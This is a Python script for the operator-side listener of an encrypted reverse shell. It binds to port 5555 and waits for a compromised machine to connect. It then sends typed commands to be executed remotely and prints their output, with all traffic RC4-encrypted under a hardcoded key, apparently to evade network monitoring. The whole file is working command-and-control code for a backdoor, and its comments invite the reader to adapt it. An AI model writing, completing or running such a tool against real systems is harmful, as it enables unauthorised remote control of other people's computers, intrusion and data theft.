import socket, RC4Encryption

key = b'password' #change to something more secure
rc4 = RC4Encryption.RC4Encryption(key)
rc4.make_key()
lhost = '0.0.0.0'
lport = 5555 #change to whatever port you are using
buffer = 131072
separator = "<sep>"
s = socket.socket()
s.bind((lhost, lport))
s.listen(5)

print(f'[-] Listening as {lhost}:{lport} ...')
rsocket, rhost = s.accept()
print(f'[+] {rhost[0]}:{rhost[1]} Connected!')
cwd = rc4.crypt(rsocket.recv(buffer))
while True:
    cwd = cwd.decode()
    cmd = input(cwd + '>')
    if not cmd.strip():
        continue
    rsocket.send(rc4.crypt(cmd.encode()))
    if cmd.lower() == "exit":
        break
    out = rc4.crypt(rsocket.recv(buffer))
    results, cwd = out.split(separator.encode())
    print(results.decode())
